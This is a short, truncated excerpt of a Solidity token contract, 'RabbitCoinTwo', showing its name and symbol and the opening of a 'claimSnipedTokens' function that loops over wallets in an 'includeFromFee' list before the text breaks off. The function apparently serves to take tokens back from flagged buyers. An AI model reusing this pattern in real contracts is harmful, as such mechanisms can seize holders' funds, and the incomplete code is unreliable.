...
contract RabbitCoinTwo is Context, IERC20, Ownable {
    ...
    string private constant _name = "RabbitCoinTwo";
    string private constant _symbol = "RabbitCoin2.0";
    ...
    function claimSnipedTokens() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { address wallet = includeFromFee[i];
